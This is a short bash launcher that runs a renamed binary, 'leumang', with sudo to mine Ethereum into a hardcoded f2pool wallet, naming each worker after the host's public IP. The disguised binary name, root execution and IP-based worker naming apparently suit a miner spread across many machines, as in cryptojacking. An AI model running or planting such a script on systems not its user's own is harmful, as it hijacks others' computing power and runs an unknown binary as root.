#!/bin/bash

POOL=eth.f2pool.com:6688
WALLET=0x70278496f0eaa3810d9dbdd7f388425e029013db
WORKER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-nbapam

cd "$(dirname "$0")"

chmod +x ./leumang && sudo ./leumang -a ethash -o $POOL -u $WALLET.$WORKER $@